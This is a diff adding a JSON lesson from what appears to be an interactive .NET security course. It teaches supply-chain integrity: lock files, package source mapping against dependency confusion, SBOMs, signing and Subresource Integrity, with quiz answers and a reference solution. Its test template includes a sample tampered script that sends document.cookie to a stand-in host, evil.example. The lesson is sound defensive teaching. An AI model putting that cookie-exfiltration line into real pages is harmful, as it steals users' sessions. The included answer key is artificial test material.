@@ -1,0 +1,141 @@
+{
+  "title": "Integrity: lock files, SBOMs, signatures and SRI",
+  "summary": "Make sure what you build and serve is what you meant: locked dependency versions, package source mapping against dependency confusion, an SBOM per release, signed artifacts, and Subresource Integrity for scripts from a CDN.",
+  "minutes": 16,
+  "steps": [
+    {
+      "type": "learn",
+      "title": "How the supply chain gets attacked",
+      "body": [
+        "**A03:2025 Software Supply Chain Failures** and **A08 Software or Data Integrity Failures** cover attacks on everything between a developer's keyboard and production:",
+        "",
+        "- **Typosquatting**: `Newtonsoft.Jsom`, `reqeusts`: a malicious package one typo away.",
+        "- **Dependency confusion**: your internal package `Shop.Payments` is also published, with a higher version, on the public feed, and the build picks the public one.",
+        "- **Compromised maintainers or packages**: a real package's new version ships malware (the 2024 `xz` backdoor; npm worms that steal tokens and publish themselves).",
+        "- **Compromised build**: the CI system or a build action is changed to inject code (SolarWinds, 2020).",
+        "- **Changed CDN files**: a script loaded from a third-party CDN is replaced (the 2024 polyfill.io takeover served malicious code to more than 100,000 sites).",
+        "",
+        "Each has a control: pin and lock versions, map package sources, review new dependencies, sign and verify artifacts, and check hashes of what you load."
+      ]
+    },
+    {
+      "type": "match",
+      "prompt": "Match each attack to the control that stops it.",
+      "pairs": [
+        ["Dependency confusion with a public `Shop.Payments` 99.0.0", "`<packageSourceMapping>`: `Shop.*` only from the internal feed"],
+        ["A new transitive version appears between two builds", "`packages.lock.json` with `RestoreLockedMode` in CI"],
+        ["A CDN serves a changed script", "Subresource Integrity (`integrity=\"sha384-...\"`)"],
+        ["A tampered container image is deployed", "signature verification (`cosign verify`) before deploy"],
+        ["\"Which of our apps contain this vulnerable library?\"", "an SBOM for every release"]
+      ]
+    },
+    {
+      "type": "learn",
+      "title": "The controls, in .NET terms",
+      "body": [
+        "```xml",
+        "<!-- Directory.Build.props: lock the whole graph, and fail if it would change in CI -->",
+        "<RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>",
+        "<RestoreLockedMode Condition=\"'$(CI)' == 'true'\">true</RestoreLockedMode>",
+        "",
+        "<!-- nuget.config: each package comes from exactly one feed -->",
+        "<packageSourceMapping>",
+        "  <packageSource key=\"internal\"><package pattern=\"Shop.*\" /></packageSource>",
+        "  <packageSource key=\"nuget.org\"><package pattern=\"*\" /></packageSource>",
+        "</packageSourceMapping>",
+        "```",
+        "",
+        "- **SBOM** (software bill of materials): a machine-readable list of every component and version in a release, in **CycloneDX** or **SPDX** format (`dotnet CycloneDX Shop.sln -o sbom`, or Microsoft's `sbom-tool`). When the next big advisory lands, you search SBOMs instead of guessing.",
+        "- **Signing**: NuGet packages can be author- and repository-signed (`<trustedSigners>` in nuget.config); container images and other artifacts are signed with **Sigstore cosign**, and **SLSA provenance** records which build produced which artifact from which commit.",
+        "- **SRI** for anything loaded from someone else's server: `<script src=\"https://cdn.example/lib.js\" integrity=\"sha384-...\" crossorigin=\"anonymous\">`. The browser refuses the file if its hash differs. Better still, serve it yourself."
+      ]
+    },
+    {
+      "type": "mcq",
+      "prompt": "Your build uses the internal package `Shop.Payments` (a floating version, `*`) from the company feed, and also has nuget.org configured, without source mapping. Someone publishes `Shop.Payments` 9.0.0 on nuget.org. What protects you?",
+      "options": [
+        "Package source mapping (Shop.* only from the internal feed) and exact, locked versions",
+        "Nothing is needed: NuGet always prefers the first feed",
+        "Signing your own packages, without checking signatures",
+        "A WAF in front of the build agents"
+      ],
+      "answer": 0,
+      "explain": "Without mapping, NuGet considers every feed and takes the best match, which for a floating version is the highest. Mapping pins where each package may come from; exact versions and a lock file pin which one."
+    },
+    {
+      "type": "predict",
+      "prompt": "What does this print? (The SRI value is the algorithm, a dash, and the Base64 of the hash.)",
+      "code": [
+        "using System.Security.Cryptography;",
+        "var script = Encoding.UTF8.GetBytes(\"alert(1)\");",
+        "var sri = \"sha384-\" + Convert.ToBase64String(SHA384.HashData(script));",
+        "Console.WriteLine(sri.StartsWith(\"sha384-\"));",
+        "Console.WriteLine(SHA384.HashData(script).Length);",
+        "Console.WriteLine(sri == \"sha384-\" + Convert.ToBase64String(SHA384.HashData(Encoding.UTF8.GetBytes(\"alert(2)\"))));"
+      ],
+      "answer": ["True", "48", "False"],
+      "explain": "SHA-384 gives 48 bytes. Any change to the file gives a different hash, and the browser refuses it."
+    },
+    {
+      "type": "code",
+      "title": "Check a vendored script against its SRI",
+      "prompt": [
+        "The build checks every script it copies from a CDN against the `integrity` value in the page. Write `bool MatchesIntegrity(byte[] content, string integrity)` (`using System.Security.Cryptography;`):",
+        "",
+        "- `integrity` is one or more space-separated tokens `alg-Base64`, where `alg` is `sha256`, `sha384` or `sha512`; tokens may have options after a `?` (ignore them);",
+        "- like a browser, use only the tokens of the **strongest** algorithm present (sha512 > sha384 > sha256), and match if **any** of those equals the hash of `content`;",
+        "- unknown algorithms are ignored; no usable token, or bad Base64, means `false`. Compare hashes in constant time."
+      ],
+      "starter": [
+        "using System.Security.Cryptography;",
+        "",
+        "bool MatchesIntegrity(byte[] content, string integrity) => true;"
+      ],
+      "solution": [
+        "using System.Security.Cryptography;",
+        "",
+        "bool MatchesIntegrity(byte[] content, string integrity)",
+        "{",
+        "    var tokens = integrity.Split(' ', StringSplitOptions.RemoveEmptyEntries)",
+        "        .Select(t => t.Split('?')[0])",
+        "        .Select(t => (Alg: t.Split('-', 2)[0], Value: t.Contains('-') ? t.Split('-', 2)[1] : \"\"))",
+        "        .Select(t => (t.Alg, t.Value, Rank: t.Alg switch { \"sha256\" => 1, \"sha384\" => 2, \"sha512\" => 3, _ => 0 }))",
+        "        .Where(t => t.Rank > 0)",
+        "        .ToList();",
+        "    if (tokens.Count == 0) return false;",
+        "    var best = tokens.Max(t => t.Rank);",
+        "    var actual = best switch { 1 => SHA256.HashData(content), 2 => SHA384.HashData(content), _ => SHA512.HashData(content) };",
+        "    foreach (var t in tokens.Where(t => t.Rank == best))",
+        "    {",
+        "        try",
+        "        {",
+        "            if (CryptographicOperations.FixedTimeEquals(actual, Convert.FromBase64String(t.Value))) return true;",
+        "        }",
+        "        catch (FormatException) { }",
+        "    }",
+        "    return false;",
+        "}"
+      ],
+      "hints": [
+        "Split on spaces, drop anything after `?`, split each token at the first `-` into algorithm and value.",
+        "Rank the algorithms (sha256 1, sha384 2, sha512 3), keep only the highest rank, hash `content` with that algorithm and compare to each value."
+      ],
+      "template": [
+        "{{CODE}}",
+        "",
+        "var lib = Encoding.UTF8.GetBytes(\"/*! lamp-ui 4.2.0 */ console.log('ok');\");",
+        "var evil = Encoding.UTF8.GetBytes(\"/*! lamp-ui 4.2.0 */ fetch('https://evil.example/'+document.cookie);\");",
+        "string S(string alg, byte[] b) => alg + \"-\" + Convert.ToBase64String(alg switch { \"sha256\" => SHA256.HashData(b), \"sha384\" => SHA384.HashData(b), _ => SHA512.HashData(b) });",
+        "Dojo.Eq(\"the right sha384 matches\", true, MatchesIntegrity(lib, S(\"sha384\", lib)));",
+        "Dojo.Eq(\"a changed file does not\", false, MatchesIntegrity(evil, S(\"sha384\", lib)));",
+        "Dojo.Eq(\"any of several strongest tokens may match\", true, MatchesIntegrity(lib, S(\"sha512\", evil) + \" \" + S(\"sha512\", lib)));",
+        "Dojo.Eq(\"only the strongest algorithm counts\", false, MatchesIntegrity(lib, S(\"sha256\", lib) + \" \" + S(\"sha512\", evil)));",
+        "Dojo.Eq(\"options after ? are ignored\", true, MatchesIntegrity(lib, S(\"sha256\", lib) + \"?ct=application/javascript\"));",
+        "Dojo.Eq(\"unknown algorithms are ignored\", true, MatchesIntegrity(lib, \"md5-AAAA \" + S(\"sha256\", lib)));",
+        "Dojo.Eq(\"only unknown algorithms: false\", false, MatchesIntegrity(lib, \"md5-AAAA sha1-BBBB\"));",
+        "Dojo.Eq(\"empty: false\", false, MatchesIntegrity(lib, \"\"));",
+        "Dojo.Eq(\"bad Base64: false, not a crash\", false, MatchesIntegrity(lib, \"sha384-!!!\"));"
+      ]
+    }
+  ]
+}
